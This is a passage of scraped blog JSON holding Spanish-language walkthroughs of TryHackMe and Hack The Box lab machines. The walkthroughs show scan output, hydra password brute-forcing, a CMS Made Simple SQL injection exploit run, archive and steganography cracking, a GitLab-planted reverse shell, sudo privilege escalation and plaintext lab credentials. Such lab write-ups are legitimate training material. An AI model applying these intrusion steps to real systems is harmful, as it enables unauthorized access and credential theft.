Zachary vemos algunos archivos con extencion rtf, los cuales podemos abrir utilizando Writer de LibreOffice y obtener la informacion que necesitamos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  meterpreter \u0026gt; ls Listing: C:\\Users\\Timmy\\Desktop =============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 1155 fil 2020-02-04 17:15:48 -0600 RuneLite.lnk 100666/rw-rw-rw- 282 fil 2020-02-04 13:56:30 -0600 desktop.ini 100666/rw-rw-rw- 42337 fil 2020-02-04 17:14:03 -0600 home work.rtf 100666/rw-rw-rw- 43806 fil 2020-02-04 17:14:03 -0600 important.rtf 100666/rw-rw-rw- 41978 fil 2020-02-04 17:14:03 -0600 rune scape pass word.rtf 100777/rwxrwxrwx 41 fil 2020-02-04 13:59:32 -0600 script.bat meterpreter \u0026gt; dir Listing: C:\\Users\\Zachary\\Desktop\\Work Documents ================================================ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 42457 fil 2020-02-04 17:12:36 -0600 Email Backup - Mockup.rtf 100666/rw-rw-rw- 12234768 fil 2020-02-04 17:12:36 -0600 Mockup 1.png 100666/rw-rw-rw- 11780324 fil 2020-02-04 17:12:36 -0600 Mockup 2.png 100666/rw-rw-rw- 680 fil 2020-02-04 15:44:41 -0600 To-Do List.rtf   RDP - Desktop Utilizamos el servicio RDP de la maquina para obtener las flags dentro de Firefox del usuario Zachary y Timmy, para iniciar sesion en este servicio utilizamos al usuario Zachary y la contraseña que encontramos en TeamViewer:\nZachary\nTimmy\n","description":"","id":56,"section":"posts","tags":["windows"],"title":"TryHackMe - Pepega Energy","uri":"https://sckull.github.io/posts/pepegaenergy/"},{"content":"Simple CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Simple CTF     Info Beginner level ctf   Puntos 2680   Dificultad Facil   Maker MrSeth6797    NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (2222) y el puerto ftp (21) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  # Nmap 7.80 scan initiated Wed Feb 5 00:40:46 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.235.105 Nmap scan report for 10.10.235.105 Host is up (0.17s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.1.72 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 2 disallowed entries |_/ /openemr-5_0_1_3 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a💿a9:23 (RSA) | 256 9b:d1:65:07:51:08:00:61:98🇩🇪95:ed:3a:e3:81:1c (ECDSA) |_ 256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 5 00:46:01 2020 -- 1 IP address (1 host up) scanned in 314.63 seconds   FTP Accedemos al servicio ftp mediante el \u0026lsquo;usuario\u0026rsquo; anonymous y encontramos una nota en la que nos muestra un mensaje que indica que la contraseña es la misma que el usuario y la contraseña puede ser crackeada en segundos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  root@aoiri:~/tryhackme/simplectf# ftp 10.10.235.105 Connected to 10.10.235.105. 220 (vsFTPd 3.0.3) Name (10.10.235.105:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Aug 17 18:24 pub 226 Directory send OK. ftp\u0026gt; cd pub 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 166 Aug 17 18:24 ForMitch.txt 226 Directory send OK. ftp\u0026gt; get ForMitch.txt local: ForMitch.txt remote: ForMitch.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for ForMitch.txt (166 bytes). 226 Transfer complete. 166 bytes received in 0.00 secs (953.5845 kB/s) ftp\u0026gt; exit 221 Goodbye. root@aoiri:~/tryhackme/simplectf# cat ForMitch.txt Dammit man... you\u0026#39;te the worst dev i\u0026#39;ve seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess! root@aoiri:~/tryhackme/simplectf#   HTTP Encontramos la pagina principal de Apache en el puerto http (80).\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 3 4 5 6 7  root@aoiri:~/tryhackme/simplectf# gobuster dir -u 10.10.235.105 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -x php,html,txt -q /index.html (Status: 200) /index.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /simple (Status: 301)   /simple Encontramos un CMS corriendo en la maquina especificamente CMS Made Simple, vemos la version que esta corriendo en el footer de la pagina.\nCMS Made Simple - CVE-2019-9053 Encontramos una vulnerabilidad de Inyeccion SQL que afecta a este CMS, utilizamos el exploit para obtener el usuario y contraseña.\nCMS Made Simple \u0026lt; 2.2.10 - SQL Injection\n1 2 3 4 5 6 7  python CVE-2019-9053.py -u http://10.10.2.28/simple/ --crack -w 10k-most-common.txt [+] Salt for password found: 1dac0d9***fa6bb2 [+] Username found: mitch [+] Email found: admin@admin.com [+] Password found: 0c01f4468b*****a84c7eb73846e8d96 [+] Password cracked: ******   Intentamos utilizar las credenciales que encontramos en el panel de Made Simple pero no logramos iniciar sesion.\nSSH - User Utilizamos las credenciales que encontramos en el servicio SSH para poder obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una enumeracion sencilla con sudo -l -l para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos a /usr/bin/vim, para obtener una shell utilizamos GTFOBINS.\nObtenemos nuestra shell con usuario root y nuestra flag root.txt.\n","description":"","id":57,"section":"posts","tags":["linux"],"title":"TryHackMe - Simple CTF","uri":"https://sckull.github.io/posts/simplectfthm/"},{"content":"Agent Sudo es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Agent Sudo     Info You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.   Puntos 3311   Dificultad Facil   Maker Deskel     NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # Nmap 7.80 scan initiated Tue Feb 4 21:35:26 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.235.45 Nmap scan report for 10.10.235.45 Host is up (0.20s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Annoucement Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 4 21:43:52 2020 -- 1 IP address (1 host up) scanned in 506.11 seconds   HTTP WHATWEB Esca corriendo una pagina sobre apache 2.4.29.\n1 2 3  root@aoiri:~/tryhackme/agentsudo# whatweb http://10.10.235.45 http://10.10.235.45 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.235.45], Title[Annoucement] root@aoiri:~/tryhackme/agentsudo#   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 3 4  root@aoiri:~/tryhackme/agentsudo# gobuster dir -u 10.10.235.45 -w /usr/share/wordlists/dirb/common_nofirst10.txt -x php,html,txt -t 15 -q /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403)   HTTP Web Al visitar la pagina encontramos un mensaje, en el cual nos mencionan el user-agent y que debemos de utilizar nuestro nombre en codigo para acceder.\nUtilizamos \u0026lsquo;R\u0026rsquo; en User-Agent y nos muestra un mensaje distinto.\nUtilizamos BURPSUITE para poder realizar distintas peticiones con el \u0026lsquo;User-Agent\u0026rsquo; utilizando como payloads:\n1 2 3  \u0026gt;\u0026gt;\u0026gt; import string \u0026gt;\u0026gt;\u0026gt; print string.printable 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~   Encontramos que existe el Agente C, el contenido solo puede ser visto en nuestro navegador ya que nos redirige hacia otra pagina.\nAgente C:\nNos muestra un mensaje que muestra el nombre del agente \u0026lsquo;chris\u0026rsquo;.\nFTP Para poder acceder al servicio de FTP utilizamos hydra para realizar fuerza bruta a la contraseña con el usuario chris.\n1 2 3 4 5 6 7 8 9 10  root@aoiri:~/tryhackme/agentsudo# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.235.45 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-04 22:13:47 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ftp://10.10.235.45:21/ [STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active [21][ftp] host: 10.10.235.45 login: chris password: ******* 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-04 22:14:56   Al acceder nos encontramos con varios archivos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  root@aoiri:~/tryhackme/agentsudo# ftp 10.10.235.45 Connected to 10.10.235.45. 220 (vsFTPd 3.0.3) Name (10.10.235.45:root): chris 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 217 Oct 29 12:15 To_agentJ.txt -rw-r--r-- 1 0 0 33143 Oct 29 12:22 cute-alien.jpg -rw-r--r-- 1 0 0 34842 Oct 29 12:33 cutie.webp 226 Directory send OK. ftp\u0026gt; mget * mget To_agentJ.txt? y 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes). 226 Transfer complete. 217 bytes received in 0.00 secs (1.3526 MB/s) mget cute-alien.jpg? y 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes). 226 Transfer complete. 33143 bytes received in 0.22 secs (145.3596 kB/s) mget cutie.webp? y 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for cutie.webp (34842 bytes). 226 Transfer complete. 34842 bytes received in 0.35 secs (95.8564 kB/s) ftp\u0026gt;   En el archivo de texto nos muestra un mensaje para el Agente J, en el que explica que la contraseña esta dentro de la imagen falsa.\n1 2 3 4 5 6 7  root@aoiri:~/tryhackme/agentsudo# cat To_agentJ.txt Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\u0026#39;t be a problem for you. From, Agent C   STEGO Utilizamos binwalk para ver el contenido de las imagenes y vemos que la imagen PNG tiene un archivo de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cute-alien.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cutie.webp DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced 869 0x365 Zlib compressed data, best compression 34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt 34820 0x8804 End of Zip archive, footer length: 22 root@aoiri:~/tryhackme/agentsudo/tmp#   Extraemos el contenido de la imagen con binwalk y encontramos un archivo comprimido que contiene el archivo de texto, utilizamos john the ripper para obtener la contraseña por fuerza bruta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# zip2john 8702.zip \u0026gt; hash_zip ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# cat hash_zip 8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e[... hash-here-dont-show-cuz-tryhackme-ban-me-:v-end ...]*$/zip2$:To_agentR.txt:8702.zip:8702.zip root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# john hash_zip Using default input encoding: UTF-8 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x]) Will run 2 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist ***** (8702.zip/To_agentR.txt) 1g 0:00:00:00 DONE 2/3 (2020-02-04 22:58) 1.052g/s 46303p/s 46303c/s 46303C/s 123456..Peter Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted#   Extraemos los archivos del archivo zip:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# 7z x 8702.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 280 bytes (1 KiB) Extracting archive: 8702.zip -- Path = 8702.zip Type = zip Physical Size = 280 Enter password (will not be echoed): ***** Everything is Ok Size: 86 Compressed: 280 root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# ls 365 365.zlib 8702.zip hash_zip To_agentR.txt   Vemos un mensaje que nos muestra la contraseña de la que nos mencionaba la anterior nota:\n1 2 3 4 5 6 7 8  root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# cat To_agentR.txt Agent C, We need to send the picture to \u0026#39;*******\u0026#39; as soon as possible! By, Agent R root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted#   Utilizamos la contraseña (decodificada en base64) para obtener los archivos de la imagen JPG:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@aoiri:~/tryhackme/agentsudo/tmp# steghide extract -sf cute-alien.jpg Enter passphrase: wrote extracted data to \u0026#34;message.txt\u0026#34;. root@aoiri:~/tryhackme/agentsudo/tmp# cat message.txt Hi james, Glad you find this message. Your login password is ************ Don\u0026#39;t ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, chris root@aoiri:~/tryhackme/agentsudo/tmp#   SSH - User Ahora que tenemos las credenciales, las utilizamos con el servicio SSH de la maquina, obtenemos nuestra shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una enumeracion sencilla con sudo -l para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos /bin/bash pero al intentar ejecutarlo con sudo no se ejecuta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  james@agent-sudo:~$ sudo -l -l [sudo] password for james: Matching Defaults entries for james on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on agent-sudo: Sudoers entry: RunAsUsers: ALL, !root Commands: /bin/bash james@agent-sudo:~$ sudo /bin/bash Sorry, user james is not allowed to execute \u0026#39;/bin/bash\u0026#39; as root on agent-sudo. james@agent-sudo:~$   Buscamos una vulnerabilidad para sudo y vemos que existe un exploit con el cual podemos obtener acceso de superusuario.\nsudo 1.8.27 - Security Bypass\nDescargamos el exploit, lo ejecutamos, obtenemos nuestra shell y nuestra flag root.txt.\n","description":"","id":58,"section":"posts","tags":["linux"],"title":"TryHackMe - Agent Sudo","uri":"https://sckull.github.io/posts/agent_sudo/"},{"content":"TryHackMe : sckull\nTelegram: TryHackMe Español\nHackTheBox: sckull\nGithub: sckull\nTwitter: @sckull\n ","description":"Zzo about page","id":59,"section":"","tags":null,"title":"About","uri":"https://sckull.github.io/about/"},{"content":"Bitlab es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Craft     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.114   Makers Frey \u0026amp; thek    MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  root@kali:~/htb/bitlab# masscan -p1-65535,U:1-65535 10.10.10.114 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-24 23:21:55 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.114 Discovered open port 22/tcp on 10.10.10.114 root@kali:~/htb/bitlab# nmap -p- --min-rate 1000 10.10.10.114 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-24 19:23 EDT Nmap scan report for 10.10.10.114 Host is up (0.34s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 133.40 seconds # Nmap 7.80 scan initiated Tue Sep 24 19:26:19 2019 as: nmap -sV -sC -p22,80 -o nmap.scan 10.10.10.114 Nmap scan report for 10.10.10.114 Host is up (0.083s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA) | 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA) |_ 256 c9:54:3d:91:01:78:03🆎16:14:6b:cc:f0:b7:3a:55 (ED25519) 80/tcp open http nginx | http-robots.txt: 55 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.114/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 24 19:26:30 2019 -- 1 IP address (1 host up) scanned in 11.04 seconds   HTTP Dentro del servicio de http nos muestra un panel de inicio de sesion de lo que parece gitlab.\nRobots.txt\nDentro del archivo robots.txt encontramos diferentes rutas en las cuales la mayoria nos redirige a /users/sign_in, en la unica en la que podemos navegar es en /explore pero en esta ruta no encontramos nada interesante.\nAl visitar distintas rutas dentro de esta pagina encontramos que en /help hay un archivo de html que al visitarlo contiene direcciones hacia otra pagina, menos la ultima que contiene codigo javascript codificado.\nBookmarks.html\nCodigo javascript:\n1  javascript:(function(){ var _0x4b18=[\u0026#34;\\x76\\x61\\x6C\\x75\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x5F\\x6C\\x6F\\x67\\x69\\x6E\u0026#34;,\u0026#34;\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\u0026#34;,\u0026#34;\\x63\\x6C\\x61\\x76\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x5F\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\u0026#34;,\u0026#34;\\x31\\x31\\x64\\x65\\x73\\x30\\x30\\x38\\x31\\x78\u0026#34;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()   Codigo decodificado:\n1 2 3 4 5 6  javascript:(function(){ document[\u0026#34;getElementById\u0026#34;](\u0026#34;user_login\u0026#34;)[\u0026#34;value\u0026#34;]= \u0026#34;clave\u0026#34;; document[\u0026#34;getElementById\u0026#34;](\u0026#34;user_password\u0026#34;)[\u0026#34;value\u0026#34;]= \u0026#34;11des0081x\u0026#34;\u0026#34;; } )()   GitLab Login Utilizamos las credenciales clave:11des0081x para iniciar sesion y vemos que hay diferentes proyectos dentro de gitlab.\nSHELL - Gitlab / Profile Dentro de los repositorios encontramos uno que tiene como nombre Profile, dentro de este repositorio se encuentra un archivo php (index.php) en el cual podemos ver codigo que pertenece a la pagina /profile/.\nindex.php /profile Realizamos un cambio dentro del codigo de index.php y realizamos un merge para intentar modificar la pagina /profile.\nindex.php merge\nPodemos observar que en la pagina de profile se encuentra nuestro codigo con el texto que insertamos.\nAhora que sabemos que podemos modificar codigo dentro de la pagina index, vamos a intentar crear un archivo en el repositorio con una shell inversa.\nhello.php\nexecInBackground\nnetcat\nObtenemos una shell como usuario www-data.\nSnippet - Postgres Dentro de gitlab tambien encontramos un snippet que contiene nombre, usuario y contraseña para una base de datos en postgres.\nCodigo:\n1 2 3  \u0026lt;?php $db_connection = pg_connect(\u0026#34;host=localhost dbname=profiles user=profiles password=profiles\u0026#34;); $result = pg_query($db_connection, \u0026#34;SELECT * FROM profiles\u0026#34;);   Utilizamos la porcion de codigo para ejecutarlo dentro de la maquina con php, agregando una porcion de codigo para obtener el resultado del query de la tabla profiles.\n1 2 3 4 5 6  \u0026lt;?php $db_connection = pg_connect(\u0026#34;host=localhost dbname=profiles user=profiles password=profiles\u0026#34;); $result = pg_query($db_connection, \u0026#34;SELECT * FROM profiles\u0026#34;); $arr = pg_fetch_all($result); print_r($arr); ?\u0026gt;   Codigo ejecutado:\nAl ejecutar el codigo nos devuelve un usuario y contraseña, la contraseña codificada en base64.\nCredenciales:\nclave:c3NoLXN0cjBuZy1wQHNz== clave:ssh-str0ng-p@ss SHELL - Usuario clave Actualizamos nuestra shell al intentar ingresar con la contraseña decodificada no la aceptó, utilizamos la codificada y obtuvimos shell como usuario clave.\nY Nuestra flag user.txt.\nRE (reversing engineering) - RemoteConnection.exe Dentro de la carpeta principal del usuario clave encontramos un archivo exe, trasladamos el archivo a nuestra maquina local para poder analizar el archivo.\nUtilizamos ollydbg en su version 2.01 agregamos nuestro ejecutable en la interfaz de olly.\nAl correr nuestro ejecutable nos muestra un mensaje en la ventana de ejecucion del archivo (Acceso Denegado).\nBuscamos el mensaje que nos muestra en la ventana haciendo click dentro de la ventana Search for \u0026gt; All References Strings.\nEncontramos varios mensajes (strings) vemos una string que es distinta a las demas colocamos un breakpoint en el string y volvemos a ejecutar y presionar F8.\nVemos nuestro breakpoint.\nVemos la conexion con el usuario root hacia la maquina de bitlab con la contraseña.\nCredenciales:\n-ssh root@gitlab.htb -pw Qf7]8YSV.wDNF*[7d?j\u0026amp;eD4^\u0026quot; root:Qf7]8YSV.wDNF*[7d?j\u0026amp;eD4^\u0026quot; Utilizamos las credenciales y obtenemos una shell con el usuario root y nuestra flag root.txt.\n","description":"","id":60,"section":"posts","tags":["windows","ollydbg"],"title":"Hack The Box - Bitlab","uri":"https://sckull.github.io/posts/bitlab/"},{"content":"Forest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Forest     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.158   Maker mrb3n \u0026amp; egre55    MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124  root@kali:~/htb/forest# masscan -p1-65535,U:1-65535 10.10.10.161 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-10-25 04:57:31 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 135/tcp on 10.10.10.161 Discovered open port 464/tcp on 10.10.10.161 Discovered open port 49910/tcp on 10.10.10.161 Discovered open port 58925/udp on 10.10.10.161 Discovered open port 445/tcp on 10.10.10.161 Discovered open port 139/tcp on 10.10.10.161 Discovered open port 49664/tcp on 10.10.10.161 Discovered open port 9389/tcp on 10.10.10.161 Discovered open port 49671/tcp on 10.10.10.161 Discovered open port 49666/tcp on 10.10.10.161 Discovered open port 3269/tcp on 10.10.10.161 Discovered open port 593/tcp on 10.10.10.161 Discovered open port 49667/tcp on 10.10.10.161 Discovered open port 49676/tcp on 10.10.10.161 Discovered open port 49703/tcp on 10.10.10.161 Discovered open port 49684/tcp on 10.10.10.161 Discovered open port 53/tcp on 10.10.10.161 # Nmap 7.70 scan initiated Fri Oct 25 01:01:38 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.161 Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.23s latency). Not shown: 63731 closed ports, 1780 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49676/tcp open unknown 49677/tcp open unknown 49684/tcp open unknown 49703/tcp open unknown 49910/tcp open unknown # Nmap done at Fri Oct 25 01:06:47 2019 -- 1 IP address (1 host up) scanned in 308.58 seconds # Nmap 7.70 scan initiated Fri Oct 25 01:08:05 2019 as: nmap -sV -sC -p- --min-rate 1000 -o script_nmap.scan 10.10.10.161 Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.26s latency). Not shown: 64311 closed ports, 1201 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-25 05:20:03Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 